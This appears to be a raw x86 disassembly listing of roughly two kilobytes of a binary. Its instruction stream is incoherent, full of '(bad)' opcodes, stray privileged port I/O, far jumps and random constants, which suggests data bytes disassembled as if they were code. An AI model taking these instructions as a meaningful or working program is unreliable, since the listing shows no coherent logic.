  417803:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417804:	cmp    cl,BYTE PTR [ebx-0x2d]
  417807:	inc    esi
  417808:	test   eax,0xdbf52f2e
  41780d:	mov    ebx,0xb93ee639
  417812:	sub    BYTE PTR [esi+0x343a5842],0x23
  417819:	ins    BYTE PTR es:[edi],dx
  41781a:	mov    dl,BYTE PTR [ebp+0x1e]
  41781d:	cdq    
  41781e:	dec    ebx
  41781f:	push   ebp
  417820:	jo     0x4177e3
  417822:	mov    ?,WORD PTR [edx]
  417824:	adc    esp,DWORD PTR [ebp+0x34]
  417827:	iret   
  417828:	jl     0x41788b
  41782a:	scas   eax,DWORD PTR es:[edi]
  41782b:	cmp    al,0x6b
  41782d:	xchg   edx,eax
  41782e:	push   edx
  41782f:	jbe    0x41785d
  417831:	xchg   esi,eax
  417832:	and    DWORD PTR [ebp+0x52c89036],0x5adf06fb
  41783c:	lock mov bl,0x25
  41783f:	dec    edi
  417840:	push   eax
  417841:	jmp    0x232c:0x3aee27e9
  417848:	jno    0x4177fa
  41784a:	xlat   BYTE PTR ds:[ebx]
  41784b:	sbb    eax,ecx
  41784d:	or     cl,BYTE PTR [ebx]
  41784f:	add    DWORD PTR [esi-0x40],0x7293988b
  417856:	cmp    eax,0x2e77ff34
  41785b:	or     DWORD PTR [edi+0x39bfe2a0],eax
  417861:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417862:	mov    dl,0xe5
  417864:	or     edi,eax
  417866:	int    0x8f
  417868:	lock mov ebp,0x3842f2ce
  41786e:	retf   
  41786f:	xor    BYTE PTR [edx],dl
  417871:	fadd   DWORD PTR [eax]
  417873:	ficom  WORD PTR [esi+0x4b]
  417876:	jle    0x417837
  417878:	push   ecx
  417879:	sti    
  41787a:	ds cmp eax,0x1a23053a
  417880:	sbb    esi,ebx
  417882:	outs   dx,DWORD PTR ds:[esi]
  417883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417884:	lods   eax,DWORD PTR ds:[esi]
  417885:	ror    DWORD PTR [eax+0x8],1
  417888:	aaa    
  417889:	mov    DWORD PTR [eax],edi
  41788b:	pop    ds
  41788c:	jnp    0x417870
  41788e:	call   DWORD PTR [ecx]
  417890:	fstp   DWORD PTR [edx+0x2be413fa]
  417896:	loope  0x41790d
  417898:	inc    eax
  417899:	inc    ebp
  41789a:	test   BYTE PTR [esi],dh
  41789c:	dec    ecx
  41789d:	or     al,cl
  41789f:	dec    ebx
  4178a0:	cmovge edi,esi
  4178a3:	push   es
  4178a4:	jle    0x4178e3
  4178a6:	mov    bh,0xe5
  4178a8:	mov    BYTE PTR [ecx-0x55b1c685],dl
  4178ae:	pop    es
  4178af:	jmp    0x417866
  4178b1:	jns    0x4178bf
  4178b3:	push   edi
  4178b4:	cmp    eax,0x2af86e59
  4178b9:	repnz add ebp,edi
  4178bc:	cmp    DWORD PTR [eax-0x14e67c89],edx
  4178c2:	adc    bh,bh
  4178c4:	leave  
  4178c5:	inc    esp
  4178c6:	enter  0x3c19,0x83
  4178ca:	pop    ss
  4178cb:	sbb    BYTE PTR [ebx-0x4b213c86],cl
  4178d1:	loop   0x417890
  4178d3:	mov    esp,0x88acea46
  4178d8:	iret   
  4178d9:	into   
  4178da:	popf   
  4178db:	data16 mov al,ds:0x63c79271
  4178e1:	jmp    DWORD PTR [esi*4-0x60317c8d]
  4178e8:	cdq    
  4178e9:	lods   al,BYTE PTR ds:[esi]
  4178ea:	mov    ds:0x5cb55bd5,eax
  4178ef:	jbe    0x417899
  4178f1:	cmp    BYTE PTR [edi*2+0x37b5e97f],0xd3
  4178f9:	out    dx,eax
  4178fa:	aam    0xfc
  4178fc:	dec    esi
  4178fd:	push   0xffffffc2
  4178ff:	cmp    ah,BYTE PTR [esi+0x64410b07]
  417905:	mov    WORD PTR [ebp+0x149fe792],gs
  41790b:	mov    ebp,0x97f62f7e
  417910:	push   edx
  417911:	adc    al,0x8d
  417913:	jne    0x417920
  417915:	dec    edi
  417916:	mov    es,WORD PTR [edx]
  417918:	xor    edi,DWORD PTR [esi]
  41791a:	adc    eax,0x35842980
  41791f:	pop    ss
  417920:	add    DWORD PTR [edi-0x40],0xffffff92
  417924:	xchg   esp,eax
  417925:	pop    eax
  417926:	cmp    al,0xad
  417928:	add    edx,DWORD PTR [esi+0x4c]
  41792b:	xchg   ecx,eax
  41792c:	mov    dh,0x65
  41792e:	pop    esp
  41792f:	in     al,0x8a
  417931:	sbb    DWORD PTR [eax+0x36],ebx
  417934:	dec    esi
  417935:	pop    ecx
  417936:	scas   al,BYTE PTR es:[edi]
  417937:	into   
  417938:	cwde   
  417939:	mov    cl,al
  41793b:	inc    esp
  41793c:	lods   al,BYTE PTR ds:[esi]
  41793d:	cdq    
  41793e:	repz jecxz 0x41795a
  417941:	rcr    BYTE PTR [edx+0x71],0xa3
  417945:	sbb    eax,0x89254485
  41794a:	or     BYTE PTR [ebp+ebp*8-0x43a71d35],bh
  417951:	(bad)  
  417952:	cwde   
  417953:	shl    BYTE PTR [ebx+0x6c],1
  417956:	aad    0xa0
  417958:	sar    DWORD PTR [edi],cl
  41795a:	and    al,BYTE PTR [esi-0x595bc15]
  417960:	dec    edx
  417961:	sti    
  417962:	push   ss
  417963:	mov    bh,BYTE PTR [esi-0x61]
  417966:	mov    ah,0xb9
  417968:	outs   dx,DWORD PTR ds:[esi]
  417969:	retf   
  41796a:	loopne 0x41791b
  41796c:	aaa    
  41796d:	sahf   
  41796e:	stos   DWORD PTR es:[edi],eax
  41796f:	dec    ebx
  417970:	xchg   BYTE PTR [esi],ch
  417972:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417973:	jle    0x417988
  417975:	in     al,0x63
  417977:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417978:	cmp    DWORD PTR [esp+eax*2],edx
  41797b:	test   eax,0x84163ab0
  417980:	(bad)  
  417981:	int3   
  417982:	or     ah,BYTE PTR [esi]
  417984:	mov    eax,ds:0x94d47c93
  417989:	in     al,0xbb
  41798b:	(bad)  
  41798c:	pop    edi
  41798d:	push   cs
  41798e:	add    al,ah
  417990:	mov    bh,0xaa
  417992:	cwde   
  417993:	add    edx,DWORD PTR [edi]
  417995:	adc    eax,0x751ebdd1
  41799a:	in     al,0xb
  41799c:	xchg   ebx,eax
  41799d:	test   ah,0x35
  4179a0:	mov    esi,0x97529fd6
  4179a5:	ficom  DWORD PTR [eax-0x27]
  4179a8:	xor    BYTE PTR [ebp+0x2c],ah
  4179ab:	outs   dx,BYTE PTR ds:[esi]
  4179ac:	test   BYTE PTR [edi-0x6b675df9],ah
  4179b2:	adc    esp,DWORD PTR [ecx-0x1f]
  4179b5:	in     al,dx
  4179b6:	jle    0x4179aa
  4179b8:	pop    ecx
  4179b9:	inc    eax
  4179ba:	mov    edx,0x5d70ab17
  4179bf:	dec    esp
  4179c0:	jnp    0x417961
  4179c2:	ficomp WORD PTR [edi+0x7f]
  4179c5:	mov    cs,WORD PTR [eax-0x6e]
  4179c8:	hlt    
  4179c9:	in     eax,dx
  4179ca:	jae    0x41796c
  4179cc:	mov    esp,0x39302412
  4179d1:	std    
  4179d2:	out    0xdc,al
  4179d4:	inc    ecx
  4179d5:	mov    dl,0xb2
  4179d7:	outs   dx,DWORD PTR ds:[esi]
  4179d8:	jecxz  0x4179c4
  4179da:	mov    ecx,0x7cdd7830
  4179df:	outs   dx,BYTE PTR ds:[esi]
  4179e0:	add    DWORD PTR [ebx-0x566f3aa2],eax
  4179e6:	mov    edx,0x7d0a581b
  4179eb:	dec    ebp
  4179ec:	in     al,0xb
  4179ee:	and    eax,0x5555abaa
  4179f3:	sar    BYTE PTR [edx-0x7],0x18
  4179f7:	mov    bh,0x74
  4179f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4179fa:	pop    ebp
  4179fb:	call   0xb1de:0xf6535685
  417a02:	mov    bh,0x97
  417a04:	imul   esp,DWORD PTR [ebp+eax*1+0x12888b6f],0xa3a3b567
  417a0f:	push   ss
  417a10:	scas   al,BYTE PTR es:[edi]
  417a11:	in     eax,dx
  417a12:	dec    BYTE PTR [edx+0x540e5419]
  417a18:	adc    eax,0x3e6b9445
  417a1d:	push   es
  417a1e:	add    edx,esp
  417a20:	xchg   esp,eax
  417a21:	pop    esi
  417a22:	or     edx,eax
  417a24:	fild   DWORD PTR [edi-0x1d01091d]
  417a2a:	adc    ch,BYTE PTR [ebp-0x3b96e6c]
  417a30:	(bad)  
  417a32:	add    eax,0x60f75b28
  417a37:	in     eax,dx
  417a38:	adc    al,0x96
  417a3a:	xlat   BYTE PTR ds:[ebx]
  417a3b:	pop    ebp
  417a3c:	gs mov esp,0x1a1c1f8b
  417a42:	loope  0x4179f3
  417a44:	jmp    0x417a83
  417a46:	fs stos BYTE PTR es:[edi],al
  417a48:	add    ebp,edx
  417a4a:	ficomp WORD PTR [ebp-0x3b34b5eb]
  417a50:	mov    ds:0x544e2b21,al
  417a55:	xlat   BYTE PTR ds:[ebx]
  417a56:	int3   
  417a57:	dec    ebx
  417a58:	mov    al,ds:0xe8b7a5d8
  417a5d:	mov    edx,0x24df51fb
  417a62:	pop    ecx
  417a63:	inc    DWORD PTR [edx-0x3a]
  417a66:	in     eax,0x3e
  417a68:	fwait
  417a69:	cmc    
  417a6a:	popa   
  417a6b:	js     0x417a1d
  417a6d:	xchg   ebx,eax
  417a6e:	lahf   
  417a6f:	jge    0x417a86
  417a71:	outs   dx,BYTE PTR ds:[esi]
  417a72:	dec    esp
  417a73:	jne    0x417a7a
  417a75:	rcl    eax,cl
  417a77:	shr    edx,0x2f
  417a7a:	repz push eax
  417a7c:	mov    eax,DWORD PTR [ebp+0x38724483]
  417a82:	mov    edi,0x177e2aa2
  417a87:	mov    ds:0xbcf0481f,al
  417a8c:	pop    ecx
  417a8d:	fisubr WORD PTR [ebp-0x4b]
  417a90:	pause  
  417a92:	push   ds
  417a93:	xlat   BYTE PTR ds:[ebx]
  417a94:	data16 jle 0x417adf
  417a97:	mov    bl,0xb7
  417a99:	into   
  417a9a:	mov    WORD PTR [ecx+0xf],ss
  417a9d:	xor    al,0x27
  417a9f:	in     eax,dx
  417aa0:	inc    esp
  417aa1:	pop    esp
  417aa2:	(bad)  
  417aa3:	sub    al,0x12
  417aa5:	aaa    
  417aa6:	out    0x20,al
  417aa8:	cmp    BYTE PTR [esi-0x1eccd0a3],dh
  417aae:	pop    ss
  417aaf:	jae    0x417a42
  417ab1:	or     al,0x2d
  417ab3:	cmp    ecx,DWORD PTR [eax+ebp*2]
  417ab6:	in     al,dx
  417ab7:	jp     0x417aba
  417ab9:	rcr    DWORD PTR ds:0x5855cd86,0x18
  417ac0:	pop    ebx
  417ac1:	mov    eax,0xc83e6f4c
  417ac6:	mov    eax,ds:0x82bd5120
  417acb:	jno    0x417b3f
  417acd:	aas    
  417ace:	cld    
  417acf:	xchg   edx,eax
  417ad0:	int3   
  417ad1:	dec    eax
  417ad2:	pop    es
  417ad3:	mov    ds:0x971c276a,eax
  417ad8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417ad9:	iret   
  417ada:	outs   dx,DWORD PTR ds:[esi]
  417adb:	pop    esi
  417adc:	call   0xb863:0xfe004e63
  417ae3:	sbb    eax,0x6ecc57b4
  417ae8:	pop    ecx
  417ae9:	sub    BYTE PTR [ebx-0x2e],cl
  417aec:	add    al,0xc1
  417aee:	sbb    eax,0x7da10484
  417af3:	icebp  
  417af4:	push   eax
  417af5:	mov    ds:0xd409b9f7,eax
  417afa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417afb:	xlat   BYTE PTR ds:[ebx]
  417afc:	xchg   esi,eax
  417afd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417afe:	xchg   BYTE PTR [ecx-0x6d005171],dh
  417b04:	and    eax,0xccacf363
  417b09:	push   cs
  417b0a:	jno    0x417ac3
  417b0c:	jle    0x417b40
  417b0e:	xchg   esp,eax
  417b0f:	mov    ebx,0x2b447de9
  417b14:	xchg   ebp,eax
  417b15:	sbb    BYTE PTR [ebx],dl
  417b17:	cmp    BYTE PTR [edi+eax*1],0x5a
  417b1b:	xor    eax,0xe19bc9d5
  417b20:	jne    0x417aac
  417b22:	add    eax,0x8d7a67bf
  417b27:	mov    dl,0x5f
  417b29:	push   0x78
  417b2b:	cs adc eax,0xc5d3b2d
  417b31:	cmp    al,0x17
  417b33:	adc    eax,0x211ac67b
  417b38:	sar    DWORD PTR [edi+0x69],cl
  417b3b:	cmp    BYTE PTR ds:0xf5060c0a,al
  417b41:	inc    edi
  417b42:	aas    
  417b43:	enter  0x6e4d,0x29
  417b47:	vhaddps xmm4,xmm3,xmm7
  417b4b:	mov    ebx,esi
  417b4d:	es xchg ebp,eax
  417b4f:	clc    
  417b50:	rol    edx,cl
  417b52:	cwde   
  417b53:	jge    0x417b29
  417b55:	mov    edi,0xbe990a87
  417b5a:	pop    ss
  417b5b:	mul    DWORD PTR [edx+0x63]
  417b5e:	mov    esi,0x8ef1c503
  417b63:	cmp    cl,BYTE PTR ds:0xeaa4779d
  417b69:	mov    bh,0x36
  417b6b:	xchg   BYTE PTR [ebp+0x3ba5743c],cl
  417b71:	sahf   
  417b72:	adc    ch,BYTE PTR [eax+edx*4]
  417b75:	js     0x417bf6
  417b77:	jns    0x417b2a
  417b79:	popa   
  417b7a:	add    dl,bl
  417b7c:	stc    
  417b7d:	xchg   ebp,eax
  417b7e:	fnstsw WORD PTR [eax+0x29]
  417b81:	xchg   ebp,eax
  417b82:	mov    edx,0x74d57069
  417b87:	inc    esi
  417b88:	and    ebp,ebp
  417b8a:	mov    eax,0x597d718a
  417b8f:	out    0x67,eax
  417b91:	xor    bh,BYTE PTR [edi+edx*2+0x40]
  417b95:	cmp    BYTE PTR [eax],0x43
  417b98:	inc    ebp
  417b99:	loop   0x417c1a
  417b9b:	or     eax,0xd4de0234
  417ba0:	rol    edx,1
  417ba2:	inc    edi
  417ba3:	xor    ch,ch
  417ba5:	pop    esp
  417ba6:	or     ch,dl
  417ba8:	xor    al,0x25
  417baa:	jb     0x417bad
  417bac:	aaa    
  417bad:	je     0x417bef
  417baf:	scas   al,BYTE PTR es:[edi]
  417bb0:	(bad)  
  417bb1:	lock mov DWORD PTR [edi+0x2b],ecx
  417bb5:	cmp    DWORD PTR [ebx-0x3d593cf5],eax
  417bbb:	in     al,dx
  417bbc:	out    dx,eax
  417bbd:	fcom   QWORD PTR [edx+0x55]
  417bc0:	cwde   
  417bc1:	hlt    
  417bc2:	push   ecx
  417bc3:	and    al,BYTE PTR [ebp-0x4e27c71c]
  417bc9:	lods   eax,DWORD PTR ds:[esi]
  417bca:	fs mul bl
  417bcd:	xchg   edx,eax
  417bce:	mov    BYTE PTR ds:0xf2d933fb,ch
  417bd4:	sub    BYTE PTR [esi-0x708d66cb],0xa5
  417bdb:	or     BYTE PTR [esi+0x65],dh
  417bde:	jge    0x417c3b
  417be0:	pop    ss
  417be1:	gs sbb eax,0x32fadce1
  417be7:	int3   
  417be8:	pop    edi
  417be9:	mov    esp,0xb9550beb
  417bee:	pop    eax
  417bef:	repnz mov bl,0xa1
  417bf2:	(bad)
  417bf6:	adc    bl,bl
  417bf8:	inc    edx
  417bf9:	jecxz  0x417c60
  417bfb:	int3   
  417bfc:	or     DWORD PTR [eax+0x4629c437],ebp
  417c02:	imul   BYTE PTR [ecx-0xe96d597]
  417c08:	call   0x92b2e82
  417c0d:	sbb    dl,BYTE PTR [esi+edx*4]
  417c10:	sub    DWORD PTR [edx+ebx*8+0xa],ebx
  417c14:	jle    0x417c3b
  417c16:	push   ebx
  417c17:	pop    esi
  417c18:	in     al,0x47
  417c1a:	loopne 0x417c28
  417c1c:	enter  0xa040,0xde
  417c20:	retf   
  417c21:	mov    eax,DWORD PTR [esi+0xa87dc33]
  417c27:	pop    ecx
  417c28:	sub    BYTE PTR [eax+0x545ad9da],bh
  417c2e:	cmp    bl,cl
  417c30:	inc    edx
  417c31:	int    0xdd
  417c33:	daa    
  417c34:	mov    DWORD PTR [ecx],ebx
  417c36:	popf   
  417c37:	das    
  417c38:	sahf   
  417c39:	scas   eax,DWORD PTR es:[edi]
  417c3a:	inc    eax
  417c3b:	daa    
  417c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c3d:	lea    edi,ds:0x210c1fba
  417c43:	mov    ch,0xdf
  417c45:	jl     0x417c1d
  417c47:	jmp    0x417c02
  417c49:	cmp    al,dh
  417c4b:	jl     0x417ca7
  417c4d:	icebp  
  417c4e:	dec    BYTE PTR [esi+0x1c506460]
  417c54:	adc    BYTE PTR [esi-0x244662],ch
  417c5a:	mov    dh,0x9c
  417c5c:	jno    0x417c4d
  417c5e:	adc    eax,0xa7d80fa4
  417c63:	repnz adc edx,DWORD PTR [eax+0x5c5cb30c]
  417c6a:	adc    eax,0x11b9f2c7
  417c6f:	lds    edx,FWORD PTR [eax+edx*4+0x3630d06e]
  417c76:	pop    ds
  417c77:	jbe    0x417cb0
  417c79:	ret    0xc810
  417c7c:	mov    ebx,0x1b0fc1ea
  417c81:	mov    cl,0xc3
  417c83:	imul   esp,edx,0x6c
  417c86:	adc    DWORD PTR [edx+ebx*1],edx
  417c89:	cmp    DWORD PTR [eax-0x20],ebx
  417c8c:	push   ecx
  417c8d:	add    esp,DWORD PTR es:[esi]
  417c90:	aas    
  417c91:	fwait
  417c92:	ins    DWORD PTR es:[edi],dx
  417c93:	mov    eax,0x8937f7ab
  417c98:	enter  0x891a,0x7c
  417c9c:	push   ds
  417c9d:	fldenv [edi+0xcc395e6]
  417ca3:	fadd   DWORD PTR [ebx+0x47a0726d]
  417ca9:	pop    es
  417caa:	iret   
  417cab:	dec    esi
  417cac:	adc    bh,bl
  417cae:	xlat   BYTE PTR ds:[ebx]
  417caf:	test   eax,0x4ad464b9
  417cb4:	fist   DWORD PTR [eax]
  417cb6:	jae    0x417c82
  417cb8:	pop    ds
  417cb9:	test   WORD PTR [ebx+0x14e7ecca],sp
  417cc0:	jnp    0x417c52
  417cc2:	jmp    0x17499f1
  417cc7:	inc    esp
  417cc8:	int3   
  417cc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417cca:	test   DWORD PTR [ebx],0x4a754101
  417cd0:	adc    cl,cl
  417cd2:	sub    al,0xa5
  417cd4:	push   0xffffffee
  417cd6:	sbb    BYTE PTR [ecx*2-0x1ac1c248],dl
  417cdd:	jle    0x417ccd
  417cdf:	inc    ecx
  417ce0:	call   0x641998e9
  417ce5:	jnp    0x417cca
  417ce7:	enter  0x3fb2,0x21
  417ceb:	hlt    
  417cec:	jns    0x417d3f
  417cee:	iret   
  417cef:	lahf   
  417cf0:	retf   0x173e
  417cf3:	rcl    ebp,1
  417cf5:	fcom   QWORD PTR [eax+0x15]
  417cf8:	pop    es
  417cf9:	inc    eax
  417cfa:	iret   
  417cfb:	and    BYTE PTR [eax-0x2a902c27],bl
  417d01:	cld    
  417d02:	inc    ebx
  417d03:	jg     0x417d3b
  417d05:	pusha  
  417d06:	shr    BYTE PTR [eax+eiz*8-0x2dc4beb7],cl
  417d0d:	adc    BYTE PTR [eax-0x52a4c43c],bh
  417d13:	cmp    ebx,ebx
  417d15:	out    dx,al
  417d16:	test   eax,0x34b2fe1b
  417d1b:	dec    edx
  417d1c:	pop    edi
  417d1d:	cmp    al,0x56
  417d1f:	cmp    DWORD PTR [esi+0x12],ebx
  417d22:	ret    
  417d23:	lds    esp,FWORD PTR [eax-0x74]
  417d26:	loopne 0x417d2b
  417d28:	mov    dh,0x9a
  417d2a:	popf   
  417d2b:	sub    eax,0x62ce5800
  417d30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d31:	cdq    
  417d32:	outs   dx,BYTE PTR ds:[esi]
  417d33:	sub    ah,0x36
  417d36:	push   ds
  417d37:	sub    dl,BYTE PTR [ebp+0x6fce1b06]
  417d3d:	and    eax,0x77d9957e
  417d42:	(bad)  
  417d43:	and    ecx,DWORD PTR [ebp-0x512fdd4f]
  417d49:	xlat   BYTE PTR ds:[ebx]
  417d4a:	or     BYTE PTR [edi],0xa
  417d4d:	adc    edi,esi
  417d4f:	fdiv   QWORD PTR [ebp+0x4e]
  417d52:	addr16 mov edi,0xfa45fc89
  417d58:	fcmovu st,st(7)
  417d5a:	stc    
  417d5b:	lods   eax,DWORD PTR ds:[esi]
  417d5c:	loopne 0x417d7f
  417d5e:	mov    al,0x7c
  417d60:	xor    al,0x88
  417d62:	ins    DWORD PTR es:[edi],dx
  417d63:	sahf   
  417d64:	dec    ecx
  417d65:	int3   
  417d66:	iret   
  417d67:	jb     0x417d22
  417d69:	adc    eax,DWORD PTR [edx-0xb]
  417d6c:	pop    ebx
  417d6d:	adc    eax,0x6c44e578
  417d72:	dec    edx
  417d73:	enter  0x9886,0x7f
  417d77:	aas    
  417d78:	sub    al,0x35
  417d7a:	jns    0x417db7
  417d7c:	and    dh,bl
  417d7e:	in     eax,0x2e
  417d80:	in     eax,0xca
  417d82:	hlt    
  417d83:	(bad)  
  417d84:	frstpm(287 only) 
  417d86:	pop    edi
  417d87:	dec    edi
  417d88:	bound  edx,QWORD PTR [esi+0x471aa478]
  417d8e:	sbb    dl,dh
  417d90:	fsubrp st(6),st
  417d92:	inc    ecx
  417d93:	and    ebx,DWORD PTR [eax-0x14]
  417d96:	in     eax,0xab
  417d98:	es jbe 0x417d98
  417d9b:	retf   0xbcb0
  417d9e:	and    DWORD PTR [edi-0x79],0x4e5ee597
  417da5:	add    BYTE PTR [ecx-0x14f290aa],dl
  417dab:	cmp    edx,DWORD PTR [ecx+edi*1]
  417dae:	cmc    
  417daf:	ss jl  0x417e2e
  417db2:	jno    0x417e07
  417db4:	gs in  eax,dx
  417db6:	hlt    
  417db7:	xor    ecx,edx
  417db9:	dec    edi
  417dba:	push   eax
  417dbb:	xchg   esp,eax
  417dbc:	jmp    0x4b2eb449
  417dc1:	in     al,dx
  417dc2:	cmovae esp,esp
  417dc5:	das    
  417dc6:	mov    ah,0x92
  417dc8:	push   esp
  417dc9:	jnp    0x417dd2
  417dcb:	mov    WORD PTR ds:0x8835f2b8,ss
  417dd1:	div    bh
  417dd3:	mov    ah,BYTE PTR [edx+edx*1-0x58]
  417dd7:	ins    DWORD PTR es:[edi],dx
  417dd8:	jp     0x417d9c
  417dda:	push   es
  417ddb:	mov    ebx,0xfe5955a6
  417de0:	icebp  
  417de1:	mov    al,ds:0xa58d2995
  417de6:	repnz push edi
  417de8:	inc    esp
  417de9:	inc    edx
  417dea:	sub    al,0x54
  417dec:	push   eax
  417ded:	cmp    ah,BYTE PTR [ebx+0x79]
  417df0:	js     0x417e34
  417df2:	ins    DWORD PTR es:[edi],dx
  417df3:	push   esi
  417df4:	dec    esp
  417df5:	jne    0x417d8f
  417df7:	mov    ah,0x14
  417df9:	stos   BYTE PTR es:[edi],al
  417dfa:	cmc    
  417dfb:	mov    bl,0x63
  417dfd:	adc    al,0x8a
  417dff:	ds cmp al,0x90
  417e02:	pop    eax
  417e03:	sub    ebp,DWORD PTR [ebp+0x1ebe331e]
  417e09:	enter  0xc0ac,0x51
  417e0d:	adc    eax,0x8ad6f5bb
  417e12:	mov    ?,WORD PTR [ecx]
  417e14:	push   ebx
  417e15:	xor    esi,ecx
  417e17:	inc    eax
  417e18:	xor    al,BYTE PTR [esi-0x24650f9]
  417e1e:	out    dx,eax
  417e1f:	into   
  417e20:	inc    esp
  417e21:	dec    edi
  417e22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e23:	icebp  
  417e24:	mov    dh,0x28
  417e26:	xor    esp,eax
  417e28:	dec    ecx
  417e29:	xor    cl,al
  417e2b:	sar    DWORD PTR [edi],cl
  417e2d:	jbe    0x417e56
  417e2f:	lock xchg ebx,eax
  417e31:	push   0xffffffdc
  417e33:	xor    ch,BYTE PTR [ebp-0x30d5e5ad]
  417e39:	ret    
  417e3a:	cmp    eax,0xbba43c09
  417e3f:	jnp    0x417dd9
  417e41:	sub    ebx,ecx
  417e43:	xor    esi,DWORD PTR [esi]
  417e45:	cmp    BYTE PTR [esi-0x488bf166],0x5b
  417e4c:	jmp    0x60f2ce3a
  417e51:	scas   al,BYTE PTR es:[edi]
  417e52:	sub    BYTE PTR [esi+ebp*1],0xd0
  417e56:	sub    al,BYTE PTR [ebx+ebp*2-0x558796db]
  417e5d:	pop    esp
  417e5e:	enter  0x8c6b,0xec
  417e62:	sub    esp,DWORD PTR [ecx]
  417e64:	sbb    eax,0xaa1f20b6
  417e69:	pop    ebx
  417e6a:	xor    ebp,DWORD PTR es:[edi-0x3d]
  417e6e:	mov    bh,0xd1
  417e70:	sbb    BYTE PTR [edx],0xf3
  417e73:	das    
  417e74:	clc    
  417e75:	mov    dl,0x44
  417e77:	call   0x350f:0x6fcecafe
  417e7e:	fwait
  417e7f:	ja     0x417ed4
  417e81:	mov    ds:0x92f54e40,eax
  417e86:	jmp    0x4238db45
  417e8b:	data16 (bad) 
  417e8d:	ror    BYTE PTR [edx],1
  417e8f:	add    BYTE PTR [edx],dh
  417e91:	mov    ebx,0x443e6645
  417e96:	loope  0x417e19
  417e98:	and    al,BYTE PTR ds:0x4f09a2f3
  417e9e:	or     ch,BYTE PTR [ebp-0x59]
  417ea1:	ja     0x417ec4
  417ea3:	pop    eax
  417ea4:	imul   eax,ebx,0xfda9a998
  417eaa:	nop
  417eab:	call   0x673f:0x28cf8ac6
  417eb2:	dec    esp
  417eb3:	iret   
  417eb4:	jle    0x417e99
  417eb6:	dec    ebp
  417eb7:	add    bl,ah
  417eb9:	mov    bh,0x4f
  417ebb:	sbb    esp,DWORD PTR [esi]
  417ebd:	cld    
  417ebe:	cmp    BYTE PTR [esi+0xe],0x6f
  417ec2:	hlt    
  417ec3:	xchg   cl,cl
  417ec5:	cwde   
  417ec6:	sahf   
  417ec7:	mov    ebx,DWORD PTR [eax+0x72c851e9]
  417ecd:	push   eax
  417ece:	fwait
  417ecf:	pop    es
  417ed0:	aaa    
  417ed1:	dec    ecx
  417ed2:	sub    DWORD PTR [edx-0x21],edi
  417ed5:	fbstp  TBYTE PTR [edx-0x36]
  417ed8:	mov    bl,0xa
  417eda:	test   edi,esp
  417edc:	jp     0x417ee7
  417ede:	dec    esi
  417edf:	outs   dx,BYTE PTR ds:[esi]
  417ee0:	or     eax,DWORD PTR [ebx-0x20708488]
  417ee6:	push   DWORD PTR [ecx-0x159be50f]
  417eec:	push   0xb95336e2
  417ef1:	lods   al,BYTE PTR ds:[esi]
  417ef2:	loop   0x417f48
  417ef4:	stc    
  417ef5:	jle    0x417f1f
  417ef7:	cs out dx,al
  417ef9:	and    BYTE PTR [edx+0x80b4ce],al
  417eff:	push   eax
  417f00:	add    edi,esp
  417f02:	mov    esp,0x596df4d6
  417f07:	lods   eax,DWORD PTR ds:[esi]
  417f08:	pop    ds
  417f09:	or     eax,0x3fd44266
  417f0e:	mov    ds:0xa2733695,al
  417f13:	add    eax,0xa52722c4
  417f18:	push   edi
  417f19:	pop    ebp
  417f1a:	dec    ebp
  417f1b:	fidivr WORD PTR [ebx-0x62f702e]
  417f21:	std    
  417f22:	adc    eax,0xbe48f2a6
  417f27:	jmp    0x417eb9
  417f29:	pop    ebp
  417f2a:	inc    esi
  417f2b:	daa    
  417f2c:	sets   BYTE PTR [ecx-0x5]
  417f30:	je     0x417fa5
  417f32:	ss xchg ecx,eax
  417f34:	jno    0x417fb1
  417f36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f38:	adc    eax,0x9e4ef01f
  417f3d:	cmc    
  417f3e:	push   cs
  417f3f:	shl    BYTE PTR [ecx-0x1f],1
  417f42:	xchg   ecx,eax
  417f43:	or     eax,0x93b0f1e9
  417f48:	sbb    ecx,ecx
  417f4a:	out    0x3a,al
  417f4c:	hlt    
  417f4d:	fisubr WORD PTR [ecx+0x31]
  417f50:	fiadd  DWORD PTR [eax]
  417f52:	mov    eax,0x4800dfb3
  417f57:	mov    eax,0xf20127f6
  417f5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f5d:	sahf   
  417f5e:	add    edx,DWORD PTR [ebx+0x69]
  417f61:	xchg   edi,eax
  417f62:	ds sub ecx,esi
  417f65:	cwde   
  417f66:	push   ebp
  417f67:	and    DWORD PTR [ebx],esp
  417f69:	xor    DWORD PTR [ecx+eiz*1],ebx
  417f6c:	outs   dx,BYTE PTR ds:[esi]
  417f6d:	sub    BYTE PTR [edx+0x568b8d2a],bh
  417f73:	xor    ecx,DWORD PTR [ebx-0x5e]
  417f76:	in     al,dx
  417f77:	inc    edx
  417f78:	ins    BYTE PTR es:[edi],dx
  417f79:	mov    ds:0xcfee6d3c,al
  417f7e:	into   
  417f7f:	enter  0xd463,0xc0
  417f83:	push   esp
  417f84:	or     eax,0xa5f601b8
  417f89:	js     0x417f7a
  417f8b:	pop    DWORD PTR [esi]
  417f8d:	xchg   ebp,eax
  417f8e:	(bad)  
  417f8f:	jnp    0x417f6d
  417f91:	scas   al,BYTE PTR es:[edi]
  417f92:	mov    dl,0xcc
  417f94:	ins    BYTE PTR es:[edi],dx
  417f95:	mov    edi,0x84c297f9
  417f9a:	push   ds
  417f9b:	lods   al,BYTE PTR ds:[esi]
  417f9c:	xchg   DWORD PTR [edx],esp
  417f9e:	enter  0xe981,0xa
  417fa2:	test   DWORD PTR [ecx+0x2],eax
  417fa5:	test   eax,0x4856151
  417faa:	imul   eax,DWORD PTR [edx+ebp*1-0x65eac034],0xfffffff7
  417fb2:	push   0xffffffe7
